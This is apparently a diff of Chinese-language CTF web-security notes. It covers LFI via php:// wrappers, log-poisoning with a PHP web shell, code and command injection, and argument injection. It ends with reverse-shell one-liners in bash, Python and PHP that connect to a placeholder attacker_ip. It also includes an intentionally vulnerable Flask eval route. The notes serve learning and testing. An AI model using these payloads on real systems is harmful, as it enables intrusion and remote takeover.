@@ -1,4 +1,3 @@
-
 ## 1. Web
 Web（World Wide Web）是建立在網際網路（Internet）上的資訊系統，由瀏覽器（Client）與伺服器（Server）進行互動，透過 HTTP 協議傳遞資料。
 
@@ -68,7 +67,7 @@ alert('Hello from JS');
 #### Hash 是什麼？
 - 將任意長度的資料輸入，輸出固定長度的不可逆字串，常用於密碼加密、完整性驗證。
 
-#### ▸ 常見 Hash 演算法：
+#### 常見 Hash 演算法：
 - MD5（128 位元，容易碰撞）
 - SHA1（160 位元，也已不安全）
 - SHA256 / SHA3（目前安全性較高）
@@ -206,7 +205,7 @@ gobuster dir -u http://target.com -w common.txt
 
 ---
 
-### 後端安全機制
+### 後端安全
 
 #### Language Trick - PHP 弱型別繞過
 
@@ -285,8 +284,6 @@ PHP 支援以下特殊路徑，可用於繞過或讀檔：
 - `php://input` → 可利用 POST 傳送內容
 - `data://text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOz8+`
 
-Payload 範例：
-
 ```
 ?file=php://filter/read=convert.base64-encode/resource=index.php
 ```
@@ -301,4 +298,114 @@ Payload 範例：
 curl -A "<?php system($_GET['cmd']); ?>" http://target.com
 http://target.com/index.php?file=/var/log/apache2/access.log&cmd=id
 ```
+
+### Injection
+
+####  Code Injection
+- 定義與原理：將使用者輸入直接當作程式的一部分執行，造成未預期邏輯或任意代碼執行。
+
+常見於：`eval()`、`exec()`、`system()`、`new Function()` 等可執行字串內容的情境。
+
+- CTF 判斷技巧
+	- 輸入特定字符會導致語法錯誤
+	- 可嘗試 `1+1`, `'jyc'.__class__`, `__import__`
+	- 回傳結果有變動代表程式有運行輸入內容
+
+```python
+@app.route('/code')
+def code():
+    return eval(request.args.get('input'))
+```
+
+URL 測試：
+
+```
+http://target.com/code?input=1+1
+http://target.com/code?input=__import__('os').system('ls')
+```
+
+_ 常見繞過技巧
+	- 利用 `__class__`、`__subclasses__()` 等隱藏物件繞過
+	- 用 `chr()` 組字串規避字元限制
+	- 使用 base64 encode 再 `eval(base64.b64decode(...))`
+
+---
+
+#### Command Injection
+- 定義與原理：將使用者輸入當作系統命令的一部分執行，導致任意系統指令可被注入執行。
+
+常見於：`os.system()`, `popen()`, `exec()`, `shell_exec()` 等。
+
+- CTF 判斷技巧
+	- 輸入 `;ls`, `|id`, `&&whoami` 有回傳表示命令被執行
+	- 錯誤訊息含 `sh`, `bash`, `command not found`
+
+```
+http://target.com/ping?host=127.0.0.1;id
+http://target.com/?cmd=whoami
+```
+
+嘗試特殊符號：
+
+- `;`, `|`, `&&`, `||`, `$()`, `\` 等
+
+- 常見繞過技巧
+	- 用 URL encode 繞過：`%26%26id`
+	- 多層編碼、大小寫、空格繞過
+	- 善用 `$IFS`：空格繞過 `curl$IFShttp://jyc.com/shell.sh`
+
+---
+
+#### Argument Injection
+- 定義與原理：透過控制指令中的參數內容，使程式執行出乎預期的指令邏輯。
+
+常見於：傳入 CLI 工具、Shell script、系統命令參數時未驗證。
+
+- CTF 判斷技巧
+	- 傳入類似 `--help`, `-v`, `;` 後回傳錯誤或資訊
+	- 發現目標與 CLI 工具有關（如 zip, curl, grep）
+
+```
+curl -X POST -d 'file=--help' http://target.com/zip
+```
+
+或：
+
+```
+file=../../../../etc/passwd;--option
+```
+
+- 常見繞過技巧
+	- 混合 CLI 與路徑組合如 `-R`, `-o output.txt`
+	- 與 Command Injection 組合繞過輸出控制
+
+---
+
+#### Reverse Shell
+- 定義與原理：讓目標主機主動連線回攻擊者的 IP，將 shell 權限導回來控制。
+
+用於：已能執行命令或檔案上傳的情況，需進一步取得互動式 shell。
+
+- 常見用途情境
+	- Webshell 建立後進一步取得權限
+	- RCE 無法看輸出 → 透過反彈取得實時 shell
+	- Bypassing 防火牆 → 透過主動連回避入站封鎖
+
+```bash
+bash -i >& /dev/tcp/attacker_ip/1234 0>&1
+```
+
+```python
+python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("attacker_ip",1234));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
+```
+
+```php
+<?php system("bash -c 'bash -i >& /dev/tcp/attacker_ip/1234 0>&1'"); ?>
+```
+
+- 備註工具
+	- 攻擊端用 `nc -lvnp 1234` 傾聽
+	- 若反彈不穩可轉接 `socat`, `ngrok`, `chisel`
+
+---
 
